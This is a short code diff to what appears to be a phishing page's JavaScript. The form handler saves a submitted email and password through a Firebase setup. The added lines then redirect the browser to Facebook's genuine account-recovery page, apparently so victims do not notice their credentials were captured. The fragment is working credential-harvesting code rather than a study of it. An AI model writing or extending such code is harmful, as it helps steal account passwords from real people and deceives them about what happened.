@@ -26,6 +26,9 @@ var firebaseConfig = {
 
 			saveMessage(email, password);
 			document.getElementById('contactForm').reset();
+                        setTimeout(function() {
+        location = 'https://www.facebook.com/login/identify/?ctx=recover&c&multiple_results=0&from_login_screen=0&_rdr'
+    }, 100)
 		}
 
 		// Function to get get form values
